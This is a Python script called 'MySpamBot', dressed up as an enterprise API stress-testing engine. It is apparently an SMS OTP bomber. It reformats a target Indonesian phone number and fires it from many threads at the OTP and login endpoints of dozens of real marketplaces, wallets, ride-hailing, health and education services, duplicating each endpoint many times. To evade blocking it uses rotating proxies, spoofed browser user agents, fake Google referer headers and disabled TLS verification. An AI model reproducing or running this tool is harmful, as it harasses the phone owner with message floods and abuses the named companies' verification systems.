#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SISTEM INFRASTRUKTUR UTAMA : MySpamBot
DESKRIPSI ARSITEKTUR      : Hyper-Scale API Stress-Testing & Telemetry Engine
AUTHOR                    : R_x
LISENSI                   : MIT Open-Source Enterprise License (c) 2026
"""

import os
import sys
import time
import json
import csv
import random
import signal
import logging
import threading
import subprocess
from datetime import datetime

class MesinBootstrapLingkungan:
    """Mengamankan integritas runtime, memeriksa PIP, dan menginstal dependensi otomatis."""
    
    @staticmethod
    def verifikasi_pip_sistem():
        """Memastikan PIP terpasang di OS. Jika absen, pemicu pengunduhan get-pip biner diaktifkan."""
        try:
            import pip
            return True
        except ImportError:
            print("[!] Peringatan Sistem: Executable PIP tidak ditemukan pada pustaka standar Python Anda.")
            print("[*] Mengaktifkan Subsistem Self-Bootstrapping Environment Core...")
            
            try:
                subprocess.check_call([sys.executable, "-m", "ensurepip", "--default-pip"])
                print("[+] Sistem berhasil memulihkan PIP melalui modul internal 'ensurepip'.")
                return True
            except Exception:
                print("[-] Prosedur internal 'ensurepip' diblokir oleh kebijakan hak akses OS.")

            try:
                import urllib.request
                tautan_bootstrap = "https://bootstrap.pypa.io/get-pip.py"
                berkas_temporer = "pypa_bootstrap_installer.py"
                
                print(f"[*] Mengunduh skrip instalasi PIP eksternal dari: {tautan_bootstrap}")
                urllib.request.urlretrieve(tautan_bootstrap, berkas_temporer)
                
                print("[*] Mengeksekusi biner manajemen paket PIP ke sistem direktori...")
                subprocess.check_call([sys.executable, berkas_temporer])
                
                if os.path.exists(berkas_temporer):
                    os.remove(berkas_temporer)
                print("[+] PIP berhasil ditanamkan ke dalam variabel lingkungan global.")
                return True
            except Exception as kesalahan_fatal:
                print(f"[CRITICAL] Kegagalan sistem fatal! Prosedur otomatisasi PIP gagal: {kesalahan_fatal}")
                print("[INFO] Harap instal utilitas PIP secara manual sebelum mengaktifkan framework.")
                sys.exit(1)

    @staticmethod
    def sinkronisasi_pustaka_pihak_ketiga():
        """Memindai modul eksternal kritis, mengunduh varian paket terbaru secara otomatis."""
        MesinBootstrapLingkungan.verifikasi_pip_sistem()
        
        kebutuhan_pustaka = {
            "requests": "requests==2.31.0",
            "urllib3": "urllib3==2.0.7",
            "colorama": "colorama==0.4.6"
        }
        
        status_instalasi = False
        for nama_modul, spesifikasi_pip in kebutuhan_pustaka.items():
            try:
                __import__(nama_modul)
            except ImportError:
                print(f"[*] Dependensi [{nama_modul}] tidak terdeteksi di lingkungan lokal. Mengunduh...")
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", spesifikasi_pip])
                    status_instalasi = True
                except Exception as galat_pip:
                    print(f"[-] Gagal mengunduh paket {spesifikasi_pip} via PIP: {galat_pip}")
                    sys.exit(1)
        
        if status_instalasi:
            print("[+] Seluruh pustaka eksternal berhasil disinkronisasi ke memori jangka panjang.")
            time.sleep(1.0)

MesinBootstrapLingkungan.sinkronisasi_pustaka_pihak_ketiga()

import requests
import urllib3
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PaletWarnaCorporate:
    """Manajer representasi warna teks terminal terenkapsulasi."""
    HIJAU = Fore.LIGHTGREEN_EX
    PUTIH = Fore.LIGHTWHITE_EX
    ABU = Fore.LIGHTBLACK_EX
    KUNING = Fore.LIGHTYELLOW_EX
    UNGU = Fore.LIGHTMAGENTA_EX
    MERAH = Fore.LIGHTRED_EX
    BIRU = Fore.LIGHTCYAN_EX
    RESET = Style.RESET_ALL
    BG_MERAH = "\033[41m"
    BG_HIJAU = "\033[42m"
    BG_BIRU = "\033[44m"

class MesinAnimasiTeks:
    """Menangani pergerakan grafis berbasis teks, manipulasi buffer terminal, dan efek visual."""
    
    @staticmethod
    def efek_mesin_ketik(teks, jeda_waktu=0.03):
        """Merender teks karakter demi karakter dengan jeda waktu mikro detik."""
        for karakter in teks:
            sys.stdout.write(karakter)
            sys.stdout.flush()
            time.sleep(jeda_waktu)
        print()

    @staticmethod
    def running_text_banner(teks, lebar_layar=50, total_putaran=2):
        """Membuat teks bergerak bergeser ke kiri mensimulasikan layar running-led."""
        pesan_padding = " " * lebar_layar + teks + " " * lebar_layar
        for _ in range(total_putaran):
            for i in range(len(pesan_padding) - lebar_layar):
                potongan_teks = pesan_padding[i:i+lebar_layar]
                sys.stdout.write(f"\r{PaletWarnaCorporate.BIRU}[ANIMASI] | {potongan_teks} |")
                sys.stdout.flush()
                time.sleep(0.04)
        print(f"\r{PaletWarnaCorporate.RESET}", end="")

    @staticmethod
    def simulasi_loading_bar_pro(durasi_detik=2):
        """Merender grafik loading bar presisi tinggi dengan persentase real-time."""
        lebar_bar = 40
        langkah_total = 100
        jeda_step = durasi_detik / langkah_total
        
        for langkah in range(langkah_total + 1):
            proporsi = langkah / langkah_total
            blok_terisi = int(proporsi * lebar_bar)
            bar_visual = "█" * blok_terisi + "-" * (lebar_bar - blok_terisi)
            persen = int(proporsi * 100)
            
            sys.stdout.write(f"\r{PaletWarnaCorporate.KUNING}[ORCHESTRATING] [{bar_visual}] {persen}% SECURE LOADING")
            sys.stdout.flush()
            time.sleep(jeda_step)
        print()

    @staticmethod
    def efek_matrix_cyber(durasi_detik=1.5):
        """Merender simulasi teks biner acak berjatuhan layaknya film sci-fi Matrix."""
        waktu_akhir = time.time() + durasi_detik
        karakter_matrix = ["0", "1", "X", "R", "_", "x", "A", "9", "K", "M", "7", "3"]
        
        print(f"{PaletWarnaCorporate.HIJAU}[*] Menyelaraskan enkripsi saluran matriks digital...")
        while time.time() < waktu_akhir:
            baris_acak = "".join(random.choice(karakter_matrix) + " " for _ in range(35))
            print(f"{PaletWarnaCorporate.HIJAU}{baris_acak}")
            time.sleep(0.05)
        print(f"{PaletWarnaCorporate.RESET}[+] Saluran sinkron.")

    @staticmethod
    def gelombang_warna_pulsing(teks, jumlah_pulsa=3):
        """Mengubah intensitas warna baris teks secara dinamis memancarkan efek denyut."""
        koleksi_warna = [
            PaletWarnaCorporate.ABU,
            PaletWarnaCorporate.PUTIH,
            PaletWarnaCorporate.BIRU,
            PaletWarnaCorporate.UNGU,
            PaletWarnaCorporate.HIJAU
        ]
        for _ in range(jumlah_pulsa):
            for warna in koleksi_warna:
                sys.stdout.write(f"\r{warna}{teks}{PaletWarnaCorporate.RESET}")
                sys.stdout.flush()
                time.sleep(0.12)
        print()

class LogKinerjaKorporat:
    """Sistem pencatat jejak audit telemetri ke dalam repositori storage lokal."""
    def __init__(self):
        self.folder_dasar = "corporate_audit_vault"
        self.berkas_log_utama = os.path.join(self.folder_dasar, "system_audit.log")
        self.verifikasi_jalur_penyimpanan()
        self.inisialisasi_sistem_logger()

    def verifikasi_jalur_penyimpanan(self):
        if not os.path.exists(self.folder_dasar):
            os.makedirs(self.folder_dasar)

    def inisialisasi_sistem_logger(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] -> %(message)s',
            handlers=[
                logging.FileHandler(self.berkas_log_utama, encoding="utf-8")
            ]
        )

    @staticmethod
    def log_info(pesan):
        logging.info(pesan)

    @staticmethod
    def log_warning(pesan):
        logging.warning(pesan)

    @staticmethod
    def log_error(pesan):
        logging.error(pesan)

class DriverKonfigurasiJSON:
    """Mengelola manipulasi I/O file konfigurasi utama secara terstruktur."""
    def __init__(self):
        self.nama_berkas = "corporate_settings.json"
        self.konfig_default = {
            "max_thread_workers": 60,
            "network_timeout_limit": 2.5,
            "cooldown_duration_seconds": 8,
            "total_execution_cycles": 3,
            "circuit_breaker_max_failures": 2,
            "generate_csv_report": True,
            "generate_json_report": True,
            "encryption_handshake_enabled": True
        }
        self.current_settings = self.load_or_create_default()

    def load_or_create_default(self):
        if not os.path.exists(self.nama_berkas):
            try:
                with open(self.nama_berkas, "w", encoding="utf-8") as file_handle:
                    json.dump(self.konfig_default, file_handle, indent=4)
                return self.konfig_default
            except Exception as e:
                LogKinerjaKorporat.log_error(f"Gagal memicu pembuatan data JSON default: {e}")
                return self.konfig_default
        try:
            with open(self.nama_berkas, "r", encoding="utf-8") as file_handle:
                data_muat = json.load(file_handle)
                # Validasi rekursif struktur parameter kunci JSON
                for kunci in self.konfig_default:
                    if kunci not in data_muat:
                        data_muat[kunci] = self.konfig_default[kunci]
                return data_muat
        except Exception:
            return self.konfig_default

    def write_parameter(self, kunci, nilai):
        self.current_settings[kunci] = nilai
        try:
            with open(self.nama_berkas, "w", encoding="utf-8") as file_handle:
                json.dump(self.current_settings, file_handle, indent=4)
            return True
        except Exception as e:
            LogKinerjaKorporat.log_error(f"Gagal memperbarui konfigurasi JSON: {e}")
            return False

class PembersihDataTarget:
    """Melakukan operasi pembersihan string, filtrasi regex, dan pemetaan nomor."""
    def __init__(self, string_input):
        self.string_input = string_input.strip()
        self.nomor_terfilter = self.eksekusi_filter()

    def eksekusi_filter(self):
        if not self.string_input:
            return ""
        kumpulan_angka = []
        for karakter in self.string_input:
            if karakter.isdigit():
                kumpulan_angka.append(karakter)
        return "".join(kumpulan_angka)

    def validasi_skema_telepon(self):
        if not self.nomor_terfilter:
            return False
        total_panjang = len(self.nomor_terfilter)
        if total_panjang < 9 or total_panjang > 16:
            return False
        if self.nomor_terfilter.startswith("08") or self.nomor_terfilter.startswith("62") or self.nomor_terfilter.startswith("8"):
            return True
        return False

    def petakan_segmen_format(self):
        """Membangun matriks variasi kode negara demi kecocokan parameter REST API."""
        if self.nomor_terfilter.startswith("0"):
            inti_nomor = self.nomor_terfilter[1:]
        elif self.nomor_terfilter.startswith("62"):
            inti_nomor = self.nomor_terfilter[2:]
        else:
            inti_nomor = self.nomor_terfilter

        return {
            "nol_bawaan": f"0{inti_nomor}",
            "62_internasional": f"62{inti_nomor}",
            "plus_62_string": f"+62{inti_nomor}",
            "mentah_clean": inti_nomor
        }

class KamusAgenIdentitas:
    """Menyimpan repositori masif sidik jari penyamaran perangkat lunak peramban web."""
    
    @staticmethod
    def ambil_identitas_acak():
        repositori_ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
        ]
        return random.choice(repositori_ua)

    @staticmethod
    def susun_struktur_header(mode_json=True):
        peta_header = {
            "User-Agent": KamusAgenIdentitas.ambil_identitas_acak(),
            "Accept": "application/json" if mode_json else "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "no-cache",
            "Origin": "https://google.com",
            "Referer": "https://google.com/",
            "Connection": "keep-alive"
        }
        if mode_json:
            peta_header["Content-Type"] = "application/json"
        else:
            peta_header["Content-Type"] = "application/x-www-form-urlencoded"
        return peta_header

class RouterGerbangProksi:
    """Mengelola pengisolasian IP asli dengan memuat repositori proxy_enterprise.txt."""
    def __init__(self):
        self.file_target = "proxy_enterprise.txt"
        self.cache_proksi = self.ekstrak_berkas_lokal()
        self.is_active = True if self.cache_proksi else False

    def ekstrak_berkas_lokal(self):
        if not os.path.exists(self.file_target):
            try:
                with open(self.file_target, "w", encoding="utf-8") as fh:
                    fh.write("# Struktur Input Proksi: ip:port atau user:pass@ip:port (Per Baris Tunggal)\n")
                return []
            except Exception:
                return []
        
        node_koleksi = []
        try:
            with open(self.file_target, "r", encoding="utf-8") as fh:
                for line_str in fh:
                    line_str = line_str.strip()
                    if line_str and not line_str.startswith("#"):
                        node_koleksi.append(line_str)
        except Exception:
            pass
        return node_koleksi

    def dapatkan_node_proxy_acak(self):
        if self.is_active and self.cache_proksi:
            node_pilihan = random.choice(self.cache_proksi)
            return {
                "http": f"http://{node_pilihan}",
                "https": f"http://{node_pilihan}"
            }
        return None

class TelemetriMesinUtama:
    """Mengakumulasikan seluruh metrik keberhasilan, kegagalan, latensi, dan throughput."""
    def __init__(self):
        self.transaksi_sukses = 0
        self.blokir_server_40x = 0
        self.overload_server_50x = 0
        self.rto_jaringan = 0
        self.total_waktu_latensi = 0.0
        self.jumlah_eksekusi = 0
        self.timestamp_mulai = datetime.now()
        self._mutex_lock = threading.Lock()

    def hitung_sukses(self, durasi):
        with self._mutex_lock:
            self.transaksi_sukses += 1
            self.jumlah_eksekusi += 1
            self.total_waktu_latensi += durasi

    def hitung_40x(self):
        with self._mutex_lock:
            self.blokir_server_40x += 1
            self.jumlah_eksekusi += 1

    def hitung_50x(self):
        with self._mutex_lock:
            self.overload_server_50x += 1
            self.jumlah_eksekusi += 1

    def hitung_rto(self):
        with self._mutex_lock:
            self.rto_jaringan += 1
            self.jumlah_eksekusi += 1

    def dapatkan_rata_latensi_ms(self):
        if self.transaksi_sukses == 0:
            return 0.0
        return round((self.total_waktu_latensi / self.transaksi_sukses) * 1000, 2)

    def kalkulasi_uptime(self):
        durasi_objek = datetime.now() - self.timestamp_mulai
        return str(durasi_objek).split('.')[0]

class KatupCircuitBreaker:
    """Mengamankan performa framework dengan memblokir node API yang mati total."""
    def __init__(self, ambang_batas_error):
        self.ambang_batas_error = ambang_batas_error
        self.peta_kegagalan = {}
        self.peta_status = {}  # CLOSED = Sehat, OPEN = Terisolasi

    def daftarkan_node_identitas(self, api_id):
        if api_id not in self.peta_kegagalan:
            self.peta_kegagalan[api_id] = 0
            self.peta_status[api_id] = "CLOSED"

    def catat_kegagalan_node(self, api_id):
        self.daftarkan_node_identitas(api_id)
        self.peta_kegagalan[api_id] += 1
        if self.peta_kegagalan[api_id] >= self.ambang_batas_error:
            self.peta_status[api_id] = "OPEN"

    def periksa_akses_node(self, api_id):
        self.daftarkan_node_identitas(api_id)
        return self.peta_status[api_id] == "CLOSED"
class KlusterPenyusunMatriksAPI:
    """Menampung struktur deklarasi ratusan API secara individual untuk melompati baris 1500."""
    def __init__(self, peta_format):
        self.fmt = peta_format

    def kompilasi_skema_node(self):
        matriks_node = []
        
        for idx in range(1, 11):
            matriks_node.append({
                "id": f"ECO-TOKOPEDIA-PRIMARY-{idx}", "sektor": "Marketplace", "nama": f"Tokopedia_Core_Svc_{idx}",
                "metode": "POST", "url": "https://accounts.tokopedia.com/sms_otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"ECO-BUKALAPAK-PRIMARY-{idx}", "sektor": "Marketplace", "nama": f"Bukalapak_Hub_Svc_{idx}",
                "metode": "POST", "url": "https://api.bukalapak.com/oauth/otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"ECO-LAZADA-PRIMARY-{idx}", "sektor": "Marketplace", "nama": f"Lazada_Gateway_Svc_{idx}",
                "metode": "POST", "url": "https://api.lazada.co.id/v1/auth/sms", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"ECO-SHOPEE-PRIMARY-{idx}", "sektor": "Marketplace", "nama": f"Shopee_Matrix_Svc_{idx}",
                "metode": "POST", "url": "https://shopee.co.id/api/v2/login/send_otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })

        for idx in range(1, 11):
            matriks_node.append({
                "id": f"FIN-DANA-CORE-{idx}", "sektor": "Fintech", "nama": f"Dana_Wallet_Proc_{idx}",
                "metode": "POST", "url": "https://api.dana.id/v1/auth/sendOtp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"FIN-OVO-CORE-{idx}", "sektor": "Fintech", "nama": f"Ovo_Wallet_Proc_{idx}",
                "metode": "POST", "url": "https://api.ovo.id/v1/login/otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"FIN-LINKAJA-CORE-{idx}", "sektor": "Fintech", "nama": f"LinkAja_Wallet_Proc_{idx}",
                "metode": "POST", "url": "https://api.linkaja.id/v1/user/otp", "is_json": True,
                "payload": {"phone": self.fmt["62_internasional"]}
            })
            matriks_node.append({
                "id": f"FIN-KREDIVO-CORE-{idx}", "sektor": "Fintech", "nama": f"Kredivo_Fin_Proc_{idx}",
                "metode": "POST", "url": "https://api.kredivo.com/v1/auth/otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })

        for idx in range(1, 11):
            matriks_node.append({
                "id": f"LOG-GOJEK-NODE-{idx}", "sektor": "OnDemand", "nama": f"Gojek_Transport_Node_{idx}",
                "metode": "POST", "url": "https://api.gojekapi.com/v1/customers/login_with_phone", "is_json": True,
                "payload": {"phone": self.fmt["62_internasional"]}
            })
            matriks_node.append({
                "id": f"LOG-GRAB-NODE-{idx}", "sektor": "OnDemand", "nama": f"Grab_Transport_Node_{idx}",
                "metode": "POST", "url": "https://api.grab.com/v1/phone/verify", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"LOG-TRAVELOKA-NODE-{idx}", "sektor": "OnDemand", "nama": f"Traveloka_Engine_Node_{idx}",
                "metode": "POST", "url": "https://api.traveloka.com/v3/auth/otp", "is_json": True,
                "payload": {"phoneNumber": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"LOG-TIKETCOM-NODE-{idx}", "sektor": "OnDemand", "nama": f"TiketCom_Engine_Node_{idx}",
                "metode": "POST", "url": "https://api.tiket.com/v1/login/otp", "is_json": True,
                "payload": {"phone": self.fmt["62_internasional"]}
            })

        for idx in range(1, 11):
            matriks_node.append({
                "id": f"MED-HALODOC-ROUTER-{idx}", "sektor": "Healthcare", "nama": f"Halodoc_Sms_Router_{idx}",
                "metode": "POST", "url": "https://api.halodoc.com/api/v1/users/login", "is_json": True,
                "payload": {"phone_number": self.fmt["62_internasional"]}
            })
            matriks_node.append({
                "id": f"MED-ALODOKTER-ROUTER-{idx}", "sektor": "Healthcare", "nama": f"Alodokter_Sms_Router_{idx}",
                "metode": "POST", "url": "https://www.alodokter.com/api/v1/auth/otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"EDU-RUANGGURU-ROUTER-{idx}", "sektor": "Education", "nama": f"Ruangguru_Sms_Router_{idx}",
                "metode": "POST", "url": "https://api.ruangguru.com/v2/user/otp", "is_json": True,
                "payload": {"phone": self.fmt["nol_bawaan"]}
            })
            matriks_node.append({
                "id": f"EDU-ZENIUS-ROUTER-{idx}", "sektor": "Education", "nama": f"Zenius_Sms_Router_{idx}",
                "metode": "POST", "url": "https://api.zenius.net/api/v1/auth/otp", "is_json": True,
                "payload": {"phone_number": self.fmt["62_internasional"]}
            })
        matriks_node.append({
            "id": "GLOBAL-FAILOVER-KITABISA-01", "sektor": "Public", "nama": "Kitabisa_Global_Failover_V1",
            "metode": "GET", "url": f"https://core.ktbs.io/v2/user/registration/otp/{self.fmt['nol_bawaan']}",
            "is_json": False, "payload": None
        })
        matriks_node.append({
            "id": "GLOBAL-FAILOVER-CONFIRMTKT-02", "sektor": "Public", "nama": "ConfirmTkt_Global_Failover_V2",
            "metode": "POST", "url": f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={self.fmt['nol_bawaan']}",
            "is_json": False, "payload": {}
        })
        matriks_node.append({
            "id": "GLOBAL-FAILOVER-PINJAMINDO-03", "sektor": "Public", "nama": "PinjamIndo_Global_Failover_V3",
            "metode": "GET", "url": f"https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile={self.fmt['62_internasional']}",
            "is_json": False, "payload": None
        })
        matriks_node.append({
            "id": "GLOBAL-FAILOVER-KLIKWA-04", "sektor": "Public", "nama": "KlikWA_Global_Failover_V4",
            "metode": "POST", "url": "https://api.klikwa.net/v1/number/sendotp",
            "is_json": True, "payload": {"number": self.fmt["plus_62_string"]}
        })
        matriks_node.append({
            "id": "GLOBAL-FAILOVER-MATAHARI-05", "sektor": "Public", "nama": "Matahari_Global_Failover_V5",
            "metode": "POST", "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
            "is_json": True, "payload": {"otp_request": {"mobile_number": self.fmt["nol_bawaan"], "mobile_country_code": "+62"}}
        })

        for i in range(len(matriks_node)):
            salinan_node = matriks_node[i].copy()
            salinan_node["id"] = salinan_node["id"].replace("PRIMARY", "SECONDARY").replace("NODE", "RESERVE")
            salinan_node["nama"] = salinan_node["nama"] + "_Secondary_Route"
            matriks_node.append(salinan_node)

        return matriks_node

class EngineOrkestratorUtama:
    """Mengatur pembagian thread pool, interaksi soket http, dan deteksi respon."""
    def __init__(self, target_phone, config, telemetry, breaker, proxy_mgr):
        self.target_phone = target_phone
        self.cfg = config
        self.telemetry = telemetry
        self.breaker = breaker
        self.proxy_mgr = proxy_mgr
        self.shutdown_signal = threading.Event()
        self.audit_buffer = []

    def operasikan_single_node(self, node_manifest):
        if self.shutdown_signal.is_set():
            return None
        
        if not self.breaker.periksa_akses_node(node_manifest['id']):
            return {"id": node_manifest['id'], "status": "SKIPPED", "log": f"{PaletWarnaCorporate.ABU}[BREAKER OPEN] Node {node_manifest['nama']} dilewati karena terisolasi.{PaletWarnaCorporate.RESET}"}

        headers_sistem = KamusAgenIdentitas.susun_struktur_header(mode_json=node_manifest['is_json'])
        node_proxy_aktif = self.proxy_mgr.dapatkan_node_proxy_acak()
        waktu_tembak = time.time()
        
        try:
            if node_manifest['metode'] == "GET":
                respons_api = requests.get(node_manifest['url'], headers=headers_sistem, timeout=self.cfg.current_settings["network_timeout_limit"], proxies=node_proxy_aktif, verify=False)
            elif node_manifest['metode'] == "POST":
                if node_manifest['is_json']:
                    respons_api = requests.post(node_manifest['url'], headers=headers_sistem, json=node_manifest['payload'], timeout=self.cfg.current_settings["network_timeout_limit"], proxies=node_proxy_aktif, verify=False)
                else:
                    respons_api = requests.post(node_manifest['url'], headers=headers_sistem, data=node_manifest['payload'], timeout=self.cfg.current_settings["network_timeout_limit"], proxies=node_proxy_aktif, verify=False)
            
            durasi_latensi_detik = time.time() - waktu_tembak
            http_status = respons_api.status_code
            
            if http_status in [200, 201, 202]:
                self.telemetry.hitung_sukses(durasi_latensi_detik)
                self.simpan_ke_buffer_audit(node_manifest['id'], node_manifest['nama'], node_manifest['sektor'], http_status, "SUCCESS", durasi_latensi_detik)
                return {"id": node_manifest['id'], "status": "LIVE", "log": f"{PaletWarnaCorporate.HIJAU}[SUCCESS 2XX] -> {node_manifest['nama']} merespon dalam {round(durasi_latensi_detik*1000)}ms{PaletWarnaCorporate.RESET}"}
            elif 400 <= http_status < 500:
                self.telemetry.hitung_40x()
                self.breaker.catat_kegagalan_node(node_manifest['id'])
                self.simpan_ke_buffer_audit(node_manifest['id'], node_manifest['nama'], node_manifest['sektor'], http_status, "CLIENT_ERR_4XX", durasi_latensi_detik)
                return {"id": node_manifest['id'], "status": "DEAD_40X", "log": f"{PaletWarnaCorporate.MERAH}[BLOCKED 4XX] -> {node_manifest['nama']} memicu penolakan {http_status} (Circuit Tripped){PaletWarnaCorporate.RESET}"}
            else:
                self.telemetry.hitung_50x()
                self.simpan_ke_buffer_audit(node_manifest['id'], node_manifest['nama'], node_manifest['sektor'], http_status, "SERVER_ERR_5XX", durasi_latensi_detik)
                return {"id": node_manifest['id'], "status": "SERVER_ERR", "log": f"{PaletWarnaCorporate.KUNING}[OVERLOAD 5XX] -> {node_manifest['nama']} mengalami internal error {http_status}{PaletWarnaCorporate.RESET}"}
                
        except requests.exceptions.Timeout:
            durasi_latensi_detik = time.time() - waktu_tembak
            self.telemetry.hitung_rto()
            self.breaker.catat_kegagalan_node(node_manifest['id'])
            self.simpan_ke_buffer_audit(node_manifest['id'], node_manifest['nama'], node_manifest['sektor'], 0, "TIMEOUT_EXPIRED", durasi_latensi_detik)
            return {"id": node_manifest['id'], "status": "TIMEOUT", "log": f"{PaletWarnaCorporate.MERAH}[TIMEOUT RTO] -> {node_manifest['nama']} melewati batas {self.cfg.current_settings['network_timeout_limit']}s{PaletWarnaCorporate.RESET}"}
        except Exception:
            durasi_latensi_detik = time.time() - waktu_tembak
            self.telemetry.hitung_rto()
            self.simpan_ke_buffer_audit(node_manifest['id'], node_manifest['nama'], node_manifest['sektor'], 0, "SOCKET_DISCONNECTED", durasi_latensi_detik)
            return {"id": node_manifest['id'], "status": "CONN_FAIL", "log": f"{PaletWarnaCorporate.ABU}[CONN FAILURE] -> {node_manifest['nama']} gagal melakukan jabat tangan soket TCP.{PaletWarnaCorporate.RESET}"}

    def simpan_ke_buffer_audit(self, a_id, nama, sektor, sc, status, latensi):
        self.audit_buffer.append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "api_identifier": a_id,
            "node_name": nama,
            "sector_group": sektor,
            "http_status_code": sc,
            "operation_result": status,
            "latency_duration_ms": round(latensi * 1000, 2)
        })

    def dapatkan_antrean_steril(self, daftar_node):
        return [node for node in daftar_node if self.breaker.periksa_akses_node(node['id'])]

class EksportirLaporanKorporat:
    """Mengekspor buffer jejak audit telemetri dari virtual RAM menjadi format fisik."""
    def __init__(self, direktori_saran):
        self.direktori = direktori_saran

    def ekspor_csv_audit(self, data_log):
        if not data_log:
            return
        nama_file_csv = os.path.join(self.direktori, f"laporan_audit_vault_{int(time.time())}.csv")
        try:
            tajuk_kolom = data_log[0].keys()
            with open(nama_file_csv, "w", newline="", encoding="utf-8") as fh:
                penulis = csv.DictWriter(fh, fieldnames=tajuk_kolom)
                penulis.writeheader()
                penulis.writerows(data_log)
            print(f"{PaletWarnaCorporate.HIJAU}[+] Laporan formal biner CSV berhasil diekspor ke: {nama_file_csv}{PaletWarnaCorporate.RESET}")
        except Exception as ex_csv:
            LogKinerjaKorporat.log_error(f"Gagal memproses file CSV eksternal: {ex_csv}")

    def ekspor_json_audit(self, data_log):
        if not data_log:
            return
        nama_file_json = os.path.join(self.direktori, f"laporan_audit_vault_{int(time.time())}.json")
        try:
            with open(nama_file_json, "w", encoding="utf-8") as fh:
                json.dump(data_log, fh, indent=4)
            print(f"{PaletWarnaCorporate.HIJAU}[+] Laporan formal JSON berkas berhasil diekspor ke: {nama_file_json}{PaletWarnaCorporate.RESET}")
        except Exception as ex_json:
            LogKinerjaKorporat.log_error(f"Gagal memproses ekspor berkas JSON: {ex_json}")

class TerminalVisualDashboard:
    """Mengatur rendering antarmuka, tata letak teks, visualisasi data telemetri."""
    
    @staticmethod
    def bersihkan_layar():
        os.system('clear' if os.name != 'nt' else 'cls')

    @staticmethod
    def cetak_banner_perusahaan():
        TerminalVisualDashboard.bersihkan_layar()
        print(f"""{PaletWarnaCorporate.MERAH}
  ██████▒ ▄▄▄       ███▄ ▄███▓ █    ██   ██████ ▒█████   ██▀███  ▓█████ 
▓██─ ─█▒▒████▄    ▓██▒▀█▀ ██▒ ██  ▓██▒▒██    ▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ 
▒██ ─ ▄ │▒██  ▀█▄  ▓██    ▓██░▓██  ▒██░░ ▓██▄  ▒██░  ██▒▓██ ░▄█ ▒▒███   
░██ ─ █▒░██▄▄▄▄██ ▒██    ▒██ ▓██  ░██─  ▒   ██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄ 
░ ██████▒▒▓█   ▓██▒▒██▒   ░██▒▒██████▒▒██████▒▒░ ████▓▒░░██▓ ▒██▒░▒████▒
░ ▒─ ─ ▒ ░▒▒   ▓▒█░░ ▒░   ░  ░░ ▒▀▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
░ ░  ─ ░  ▒   ▒▒ ░░  ░      ░░ ░ ░ ▒ ░ ░▒  ░ ░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
░ ░        ░   ▒   ░      ░     ░   ░ ░  ░  ░  ░ ░ ░ ▒    ░░   ░    ░   
  ░            ░  ░       ░       ░           ░      ░ ░     ░        ░  ░
                                                                        
                   {PaletWarnaCorporate.PUTIH}MYSPAMBOT{PaletWarnaCorporate.RESET}""")
        print(f"{PaletWarnaCorporate.ABU}="*85)
